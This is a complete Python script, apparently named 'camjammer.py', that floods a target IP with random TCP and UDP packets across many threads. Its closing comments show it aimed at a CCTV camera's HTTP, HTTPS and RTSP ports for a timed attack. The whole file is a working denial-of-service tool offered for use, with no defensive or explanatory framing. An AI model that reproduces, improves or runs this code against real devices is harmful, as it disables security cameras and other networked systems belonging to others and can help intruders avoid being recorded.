import socket
import random
import threading
import time
import argparse
import sys
from dataclasses import dataclass
from typing import Optional

@dataclass
class AttackConfig:
    target_ip: str
    ports: list
    packet_size: int = 1024
    max_threads: int = 50
    duration: Optional[int] = None
    verbose: bool = False

class PacketSender:
    def __init__(self, config: AttackConfig):
        self.config = config
        self.running = False
        self.threads = []
        self.stats = {
            'tcp_sent': 0,
            'udp_sent': 0,
            'errors': 0,
            'start_time': None
        }
        
    def create_socket(self, protocol):
        """Create socket with timeout and reuse address"""
        try:
            if protocol == 'tcp':
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
            else:  # udp
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            return sock
        except Exception as e:
            if self.config.verbose:
                print(f"Socket creation error: {e}")
            return None
    
    def send_tcp_packets(self, port):
        """Send TCP packets to specific port"""
        thread_stats = {'sent': 0, 'errors': 0}
        
        while self.running:
            try:
                sock = self.create_socket('tcp')
                if sock:
                    sock.connect((self.config.target_ip, port))
                    
                    # Generate random data
                    random_data = bytes(random.getrandbits(8) for _ in range(self.config.packet_size))
                    sock.sendall(random_data)
                    
                    thread_stats['sent'] += 1
                    self.stats['tcp_sent'] += 1
                    
                    # Small delay to avoid overwhelming the system
                    time.sleep(0.01)
                    
                    sock.close()
                    
            except Exception as e:
                thread_stats['errors'] += 1
                self.stats['errors'] += 1
                if self.config.verbose:
                    print(f"TCP error on port {port}: {e}")
                time.sleep(0.1)  # Backoff on error
    
    def send_udp_packets(self, port):
        """Send UDP packets to specific port"""
        thread_stats = {'sent': 0, 'errors': 0}
        
        sock = self.create_socket('udp')
        if not sock:
            return
            
        try:
            while self.running:
                try:
                    # Generate random data
                    random_data = bytes(random.getrandbits(8) for _ in range(self.config.packet_size))
                    sock.sendto(random_data, (self.config.target_ip, port))
                    
                    thread_stats['sent'] += 1
                    self.stats['udp_sent'] += 1
                    
                    # Small delay to avoid overwhelming the system
                    time.sleep(0.001)
                    
                except Exception as e:
                    thread_stats['errors'] += 1
                    self.stats['errors'] += 1
                    if self.config.verbose:
                        print(f"UDP error on port {port}: {e}")
                    time.sleep(0.1)  # Backoff on error
        finally:
            sock.close()
    
    def print_stats(self):
        """Print statistics periodically"""
        while self.running:
            elapsed = time.time() - self.stats['start_time']
            print(f"\rTCP: {self.stats['tcp_sent']} | "
                  f"UDP: {self.stats['udp_sent']} | "
                  f"Errors: {self.stats['errors']} | "
                  f"Duration: {elapsed:.1f}s", end="", flush=True)
            time.sleep(1)
    
    def start(self):
        """Start the packet sending attack"""
        print(f"Starting attack on {self.config.target_ip}")
        print(f"Ports: {self.config.ports}")
        print(f"Duration: {self.config.duration or 'unlimited'} seconds")
        print("Press Ctrl+C to stop\n")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        # Start TCP threads for each port
        for port in self.config.ports:
            for _ in range(min(5, self.config.max_threads // len(self.config.ports))):
                thread = threading.Thread(target=self.send_tcp_packets, args=(port,))
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
        
        # Start UDP threads for each port
        for port in self.config.ports:
            for _ in range(min(5, self.config.max_threads // len(self.config.ports))):
                thread = threading.Thread(target=self.send_udp_packets, args=(port,))
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        try:
            # Run for specified duration or until interrupted
            if self.config.duration:
                time.sleep(self.config.duration)
                self.stop()
            else:
                while self.running:
                    time.sleep(0.1)
                    
        except KeyboardInterrupt:
            print("\nStopping attack...")
            self.stop()
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        elapsed = time.time() - self.stats['start_time']
        
        print(f"\n\nAttack completed!")
        print(f"Total TCP packets: {self.stats['tcp_sent']}")
        print(f"Total UDP packets: {self.stats['udp_sent']}")
        print(f"Total errors: {self.stats['errors']}")
        print(f"Total duration: {elapsed:.2f} seconds")
        if elapsed > 0:
            print(f"Packets per second: {(self.stats['tcp_sent'] + self.stats['udp_sent']) / elapsed:.2f}")

def main():
    parser = argparse.ArgumentParser(description='Network packet sender utility')
    parser.add_argument('target_ip', help='Target IP address')
    parser.add_argument('-p', '--ports', nargs='+', type=int, default=[80, 554],
                       help='Target ports (default: 80 554)')
    parser.add_argument('-s', '--size', type=int, default=1024,
                       help='Packet size in bytes (default: 1024)')
    parser.add_argument('-t', '--threads', type=int, default=20,
                       help='Maximum number of threads (default: 20)')
    parser.add_argument('-d', '--duration', type=int, default=None,
                       help='Attack duration in seconds (default: unlimited)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Validate input
    if args.size <= 0 or args.size > 65535:
        print("Error: Packet size must be between 1 and 65535 bytes")
        sys.exit(1)
    
    if args.threads <= 0:
        print("Error: Thread count must be positive")
        sys.exit(1)
    
    config = AttackConfig(
        target_ip=args.target_ip,
        ports=args.ports,
        packet_size=args.size,
        max_threads=args.threads,
        duration=args.duration,
        verbose=args.verbose
    )
    
    sender = PacketSender(config)
    sender.start()

if __name__ == "__main__":
    main()


# python camjammer.py 192.168.1.10 -p 80 443 554 -d 60

# 192.168.1.10 - Target IP address (the CCTV camera)

# -p 80 443 554 - Ports to attack (HTTP, HTTPS, RTSP) where 80 is http, 443 is https & 554 is rtsp respectively.

# -d 60 - Duration of attack in seconds (60 seconds = 1 minute)